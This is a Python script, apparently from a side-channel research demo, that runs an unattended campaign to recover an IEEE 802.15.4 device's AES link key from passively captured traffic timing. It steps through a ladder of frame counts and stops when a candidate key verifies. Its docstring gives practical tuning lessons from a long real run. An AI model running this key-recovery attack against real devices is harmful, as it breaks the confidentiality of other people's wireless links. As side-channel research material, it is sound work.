"""Run the passive campaign unattended, and stop the moment a key verifies.

The capture is open-ended and the threshold is the thing being measured, so
neither "capture N frames then analyse" nor "analyse once at the end" is right.
This alternates: let the log grow, try to recover from a prefix of it, stop
when a candidate key passes the AES check.

    python demos/ota_802154/host/campaign.py --log passive.log --line-off 4 \\
        --ladder 500000,1000000,1500000,2000000,2500000,3000000

Verification is key-free: the search checks candidates against (A_1, keystream)
pairs taken from the captured traffic itself, so this does not need and does
not use the link key. `--truth` is accepted only to score progress in the log.

Four things about this that are not obvious, all of them learned on a run that
took 21 hours:

The capture process is never restarted. The listener's reader appends, so the
analysis can read a growing file while the reader keeps its port open. A
restart drops frames and, worse, tempts someone to reset the listener - which
stops its cycle counter and produces a healthy-looking record stream in which
every interval is zero.

The ladder is in frames, not in time. Wall clock is the wrong axis when the
record rate can drop: a stalled rig would otherwise pass rungs without new
data. The two captures here ran at 40.7 and 20.5 records/s and needed the same
number of frames to within 4 %.

Each rung is a PREFIX, so a rung that fails is a statement about that many
frames and stays comparable with every other rung.

The row offset is per image. Pass `--elf` and let it be derived, or pass the
number the victim's own build printed. Two builds of these sources have landed
on 4 and 12, and the wrong one costs about 2.2x in traces.
"""
from __future__ import annotations

import argparse
import os
import sys
import time

try:
    from . import frames, logread, recover as recover_mod
except ImportError:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import frames, logread
    import recover as recover_mod


def count_records(path):
    """Records so far. Counts newlines, which the log has one of per record."""
    if not os.path.exists(path):
        return 0
    n = 0
    with open(path, "rb") as fh:
        while True:
            b = fh.read(1 << 22)
            if not b:
                break
            n += b.count(b"\n")
    return n


def rung(log, limit, *, line_off, highpass, endgame, truth=None, log_fn=None):
    """One rung. (master key or None, notes)."""
    rec = logread.read_log(log, limit=limit)
    y, keep = logread.condition(rec["gap"], highpass=highpass)
    ct = frames.keystream_from_payload(rec["payload"][keep])
    known = frames.verification_pairs(log, want=1)[0]

    notes = []
    if endgame in ("marginal", "both"):
        master, ns, info = recover_mod.recover(ct, y, known, line_off=line_off,
                                               truth=truth, log=log_fn)
        notes += ns
        if master:
            return master, notes
    if endgame in ("cover", "both"):
        surfs = recover_mod.surfaces(ct, y, line_off=line_off,
                                     pairs="intra-column")
        master, ns = recover_mod.cover_search(surfs, known, pin=True,
                                             log=log_fn)
        notes += ns
        if master:
            return master, notes
    return None, notes


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--log", required=True)
    ap.add_argument("--ladder", default="500000,1000000,1500000,2000000,2500000")
    ap.add_argument("--line-off", type=int)
    ap.add_argument("--elf", help="derive the row offset from this image instead")
    ap.add_argument("--highpass", type=int, default=33)
    ap.add_argument("--endgame", choices=("marginal", "cover", "both"),
                    default="marginal",
                    help="marginal is the 120-pair byte evidence and is what "
                         "recovers these captures; cover is the older "
                         "pinned-edge search, kept as a fallback. See "
                         "host/recover.py")
    ap.add_argument("--truth", help="hex link key, for scoring the log only")
    ap.add_argument("--wait", action="store_true",
                    help="wait for the log to reach each rung instead of "
                         "skipping rungs it has not reached")
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args()

    off = a.line_off
    if a.elf:
        from flashleak.placement import row_offset_from_image
        off, addr, note = row_offset_from_image(a.elf, part="stm32f4")
        if off is None:
            sys.exit("could not derive a row offset from %s: %s" % (a.elf, note))
        print("row offset %d derived from the image (%s)" % (off, note))
    if off is None:
        sys.exit("pass --line-off or --elf. A trace count without the table's "
                 "geometry is under-specified, and a remembered number is how "
                 "this costs you 2.2x.")

    truth = bytes.fromhex(a.truth) if a.truth else None
    log_fn = (lambda *m: print(*m, flush=True)) if a.verbose else None
    t0 = time.time()
    for limit in [int(x) for x in a.ladder.split(",")]:
        have = count_records(a.log)
        while a.wait and have < limit:
            print("  %d of %d frames, waiting" % (have, limit), flush=True)
            time.sleep(300)
            have = count_records(a.log)
        if have < limit:
            print("--- rung %d: only %d frames captured, stopping" % (limit, have))
            break
        print("--- rung %d frames [%s]" % (limit, a.endgame), flush=True)
        master, notes = rung(a.log, limit, line_off=off, highpass=a.highpass,
                             endgame=a.endgame, truth=truth, log_fn=log_fn)
        for n in notes:
            print("    %s" % n, flush=True)
        if master:
            print("\nCAMPAIGN COMPLETE: key verified at %d frames (%.1f h of "
                  "analysis)" % (limit, (time.time() - t0) / 3600.0))
            print("  LINK KEY %s" % master.hex())
            if truth:
                print("  matches the key you passed: %s" % (master == truth))
            return 0
    print("\nno verified key at any rung on this log")
    return 1


if __name__ == "__main__":
    sys.exit(main())
